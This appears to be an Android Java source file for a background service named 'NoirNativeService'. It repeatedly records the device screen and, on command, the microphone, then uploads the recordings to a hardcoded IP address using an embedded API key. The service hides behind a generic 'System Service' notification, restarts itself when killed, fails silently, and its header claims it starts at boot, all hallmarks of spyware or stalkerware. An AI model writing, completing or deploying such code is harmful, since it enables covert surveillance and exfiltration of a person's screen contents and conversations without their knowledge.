package org.noir.sovereign;

import android.Manifest;
import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.AudioAttributes;
import android.media.AudioFormat;
import android.media.AudioPlaybackCaptureConfiguration;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;

/**
 * NoirNativeService - Native Android Foreground Service
 * VERSION: 21.1.0 (Native Hybrid Architecture)
 *
 * Capabilities:
 * - MediaProjection-based Screen Mirror (Real-time, 2.5s interval)
 * - MediaRecorder-based Microphone Audio Recording
 * - Self-healing on network failure
 * - Auto-start on device BOOT_COMPLETED
 */
public class NoirNativeService extends Service {

    // ─── CONSTANTS ───────────────────────────────────────────
    private static final String CHANNEL_ID          = "noir_sovereign_channel";
    private static final int    NOTIFICATION_ID     = 9001;
    public  static final String ACTION_MIRROR_START = "org.noir.sovereign.MIRROR_START";
    public  static final String ACTION_MIRROR_STOP  = "org.noir.sovereign.MIRROR_STOP";
    public  static final String ACTION_AUDIO_START  = "org.noir.sovereign.AUDIO_START";
    public  static final String EXTRA_RESULT_CODE   = "resultCode";
    public  static final String EXTRA_RESULT_DATA   = "resultData";
    public  static final String EXTRA_DURATION      = "duration";

    private static final String VPS_BASE  = "http://8.215.23.17";
    private static final String API_KEY   = "NOIR_AGENT_KEY_V6_SI_UMKM_PBD_2026";
    private static final String DEVICE_ID = "REDMI_NOTE_14";

    // ─── STATE ───────────────────────────────────────────────
    private MediaProjection          mediaProjection;
    private MediaProjectionManager   projectionManager;
    private VirtualDisplay           virtualDisplay;
    private MediaRecorder            screenRecorder;
    private ScheduledExecutorService scheduler;
    private ScheduledFuture<?>       mirrorTask;
    private volatile boolean         isMirroring = false;

    // ─── LIFECYCLE ───────────────────────────────────────────
    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, buildNotification("Noir Sovereign — STANDBY"));
        projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        scheduler = Executors.newScheduledThreadPool(3);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_STICKY;

        String action = intent.getAction();
        if (action == null) action = "";

        switch (action) {
            case ACTION_MIRROR_START:
                int resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, Activity.RESULT_CANCELED);
                Intent resultData = intent.getParcelableExtra(EXTRA_RESULT_DATA);
                if (resultCode == Activity.RESULT_OK && resultData != null) {
                    mediaProjection = projectionManager.getMediaProjection(resultCode, resultData);
                    startMirrorLoop();
                }
                break;
            case ACTION_MIRROR_STOP:
                stopMirrorLoop();
                break;
            case ACTION_AUDIO_START:
                int duration = intent.getIntExtra(EXTRA_DURATION, 10);
                scheduler.submit(() -> recordAndUploadAudio(duration));
                break;
        }
        return START_STICKY; // Restart automatically if killed by OS
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        stopMirrorLoop();
        if (scheduler != null && !scheduler.isShutdown()) scheduler.shutdownNow();
        super.onDestroy();
    }

    // ─── MIRROR ──────────────────────────────────────────────
    private void startMirrorLoop() {
        if (isMirroring) return;
        isMirroring = true;
        updateNotification("Noir Sovereign — MIRROR ACTIVE");
        // Take a frame every 2500ms
        mirrorTask = scheduler.scheduleAtFixedRate(this::captureAndUploadFrame, 0, 2500, TimeUnit.MILLISECONDS);
    }

    private void stopMirrorLoop() {
        isMirroring = false;
        if (mirrorTask != null) { mirrorTask.cancel(true); mirrorTask = null; }
        if (virtualDisplay != null) { virtualDisplay.release(); virtualDisplay = null; }
        if (screenRecorder != null) { try { screenRecorder.stop(); } catch (Exception ignored) {} screenRecorder.release(); screenRecorder = null; }
        if (mediaProjection != null) { mediaProjection.stop(); mediaProjection = null; }
        updateNotification("Noir Sovereign — STANDBY");
    }

    private void captureAndUploadFrame() {
        if (!isMirroring || mediaProjection == null) return;
        File outFile = null;
        try {
            // Get screen dimensions
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            DisplayMetrics dm = new DisplayMetrics();
            wm.getDefaultDisplay().getRealMetrics(dm);
            int sw = dm.widthPixels;
            int sh = dm.heightPixels;
            int dpi = dm.densityDpi;

            // Scale down for bandwidth
            int tw = sw / 2;
            int th = sh / 2;

            outFile = new File(getCacheDir(), "noir_frame_" + System.currentTimeMillis() + ".mp4");

            // Use MediaRecorder tied to MediaProjection for short 2-sec clip
            MediaRecorder mr = new MediaRecorder();
            mr.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mr.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            mr.setVideoSize(tw, th);
            mr.setVideoFrameRate(8);
            mr.setVideoEncodingBitRate(500_000);
            mr.setOutputFile(outFile.getAbsolutePath());
            mr.prepare();

            virtualDisplay = mediaProjection.createVirtualDisplay(
                "NoirMirror", tw, th, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                mr.getSurface(), null, null
            );
            mr.start();
            Thread.sleep(2000);
            try { mr.stop(); } catch (Exception ignored) {}
            mr.release();
            if (virtualDisplay != null) { virtualDisplay.release(); virtualDisplay = null; }

            // Upload
            if (outFile.exists() && outFile.length() > 500) {
                String key = uploadFile(outFile, "video/mp4", "mirror.mp4");
                if (key != null) notifyFrameKey(key, tw, th);
            }
        } catch (Exception e) {
            // Silent fail — will retry on next interval
        } finally {
            if (outFile != null && outFile.exists()) outFile.delete();
        }
    }

    // ─── AUDIO ───────────────────────────────────────────────
    private void recordAndUploadAudio(int durationSeconds) {
        File outFile = null;
        try {
            outFile = new File(getCacheDir(), "noir_audio_" + System.currentTimeMillis() + ".mp4");
            MediaRecorder mr = new MediaRecorder();
            mr.setAudioSource(MediaRecorder.AudioSource.MIC);
            mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mr.setAudioSamplingRate(44100);
            mr.setAudioEncodingBitRate(128000);
            mr.setOutputFile(outFile.getAbsolutePath());
            mr.prepare();
            mr.start();

            updateNotification("Noir Sovereign — RECORDING " + durationSeconds + "s");
            Thread.sleep(durationSeconds * 1000L);

            mr.stop();
            mr.release();
            updateNotification("Noir Sovereign — STANDBY");

            if (outFile.exists() && outFile.length() > 500) {
                uploadFile(outFile, "audio/mp4", "audio_" + System.currentTimeMillis() + ".mp4");
            }
        } catch (Exception e) {
            // Report failure
        } finally {
            if (outFile != null && outFile.exists()) outFile.delete();
        }
    }

    // ─── NETWORK ─────────────────────────────────────────────
    private String uploadFile(File file, String mimeType, String filename) {
        try {
            String boundary = "----NoirBoundary" + System.currentTimeMillis();
            URL url = new URL(VPS_BASE + "/agent/upload?device_id=" + DEVICE_ID);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Authorization", "Bearer " + API_KEY);
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(30000);

            try (DataOutputStream out = new DataOutputStream(conn.getOutputStream())) {
                out.writeBytes("--" + boundary + "\r\n");
                out.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + filename + "\"\r\n");
                out.writeBytes("Content-Type: " + mimeType + "\r\n\r\n");
                try (FileInputStream fis = new FileInputStream(file)) {
                    byte[] buf = new byte[4096];
                    int n;
                    while ((n = fis.read(buf)) != -1) out.write(buf, 0, n);
                }
                out.writeBytes("\r\n--" + boundary + "--\r\n");
            }

            int code = conn.getResponseCode();
            if (code == 200) {
                try (InputStream is = conn.getInputStream()) {
                    byte[] resp = is.readAllBytes();
                    String body = new String(resp);
                    // Parse "key":"...""
                    int ki = body.indexOf("\"key\":\"");
                    if (ki >= 0) {
                        int start = ki + 7;
                        int end = body.indexOf("\"", start);
                        if (end > start) return body.substring(start, end);
                    }
                }
            }
        } catch (Exception ignored) {}
        return null;
    }

    private void notifyFrameKey(String key, int w, int h) {
        try {
            URL url = new URL(VPS_BASE + "/api/screen/frame");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Authorization", "Bearer " + API_KEY);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            String body = "{\"key\":\"" + key + "\",\"width\":" + w + ",\"height\":" + h + "}";
            try (OutputStream os = conn.getOutputStream()) {
                os.write(body.getBytes());
            }
            conn.getResponseCode(); // Trigger request
        } catch (Exception ignored) {}
    }

    // ─── NOTIFICATION ────────────────────────────────────────
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL_ID, "Noir Sovereign Service",
                NotificationManager.IMPORTANCE_LOW
            );
            ch.setDescription("Background monitoring service");
            ch.setShowBadge(false);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
        }
    }

    private Notification buildNotification(String text) {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build();
    }

    private void updateNotification(String text) {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        nm.notify(NOTIFICATION_ID, buildNotification(text));
    }
}
